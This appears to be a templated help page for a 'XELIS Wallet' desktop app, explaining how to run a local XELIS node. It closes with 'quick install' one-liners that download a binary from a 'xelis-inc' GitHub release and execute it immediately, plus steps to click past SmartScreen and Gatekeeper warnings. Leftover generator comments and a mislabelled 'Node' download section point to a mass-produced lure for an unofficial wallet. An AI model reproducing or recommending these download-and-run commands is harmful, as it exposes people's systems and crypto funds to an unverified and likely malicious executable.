![Run a local XELIS node for XELIS Wallet](assets/banner-article.png)
# Run a local XELIS node for XELIS Wallet

Run the daemon, point the wallet at it and confirm the connection.

## Downloads - Node

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Get the files from the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1).

> A local node is maintenance you own: disk, sync time and updates become your responsibility.

Install the XELIS daemon, let it sync, note the RPC address it listens on, then point XELIS Wallet at that address. A connected wallet reports a current block height. You do not need a full node to use the wallet, only to stop depending on someone else's.

<!-- ARTICLE-BODY-BEGIN -->
## What running your own node buys you

A node is the machine that answers balance queries and accepts transactions for broadcast, and the wallet side of the setup is only the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a> pointed at it. Running one means those requests never leave your machine, and the wallet's view of the chain stops depending on a third party's uptime or policy.

The cost is real. The daemon has to sync, keep disk space and stay running when you want to transact. That trade is worth it for people who already run services at home, and unnecessary for someone who sends occasionally.

## Do you need a full node to use the wallet?

No. The wallet ships configured for public nodes and works without any local infrastructure. A full node is an option for control and resilience, not a prerequisite, and nothing in the wallet demands one.

The one situation where it becomes practical rather than optional is repeated connection failure against public endpoints, covered in <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-not-syncing-not-connecting-fix.md">XELIS Wallet not syncing</a>.

## Set up the daemon and let it sync

1. Get the XELIS node software from the official XELIS project, not from a mirror.
2. Start the daemon and let it sync; this is the long step and it depends on your connection.
3. Note the RPC address it listens on. The official CLI wallet expects a daemon at `127.0.0.1:8080` by default, which is a reasonable starting point for a local setup.
4. Leave the daemon running in the background.

You do not need to clone and run the whole XELIS suite to use the wallet. The daemon plus the desktop app is enough; the rest of the project is for developers and miners.

## Point the wallet at your daemon

Open the wallet's node settings if your build exposes them and replace the public endpoint with your local RPC address. Save, then reconnect. The setting itself is described in <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-node-settings-public-own.md">XELIS Wallet node settings</a>, including what the public default means.

Success looks specific: the wallet reconnects, sync progress advances and the block height it reports matches the daemon's. If the wallet still cannot connect, confirm the daemon is running and that the address you entered matches the one it logs on startup.

## What changes, and what does not

The address, the phrase and the balance stay exactly as they were. Only the machine serving the chain view changes. Nothing is migrated and no reinstall is involved.

If you later stop running the daemon, point the wallet back at a public node; it will resync against that endpoint without any wallet data being lost.

## The privacy side of self-hosting

A public node sees your IP and the addresses you query, and your own daemon removes that observer without hiding anything on chain. <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-privacy-what-it-hides.md">What a node sees about your wallet</a> separates the two.

## FAQ
### Do I need a full node to use XELIS Wallet?
No. Public nodes are the default and work without any local setup.

### How much disk does the daemon need?
It depends on the chain's current size, and these docs do not have a verified figure. Check the daemon's own documentation before you commit a drive.

### Can I run the daemon on another machine on my network?
Yes, as long as the wallet can reach its RPC address and you accept that traffic on your network.

### What if the wallet cannot see the daemon?
Confirm the daemon is running, read the address it logs, and check that a firewall is not blocking the port.

<!-- ARTICLE-BODY-END -->
## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [XELIS Wallet node settings](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-node-settings-public-own.md)
- [XELIS Wallet not syncing](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-not-syncing-not-connecting-fix.md)
- [What a node sees about your wallet](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-privacy-what-it-hides.md)
- [Read the XELIS Wallet logs](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-logs-report-bug.md)
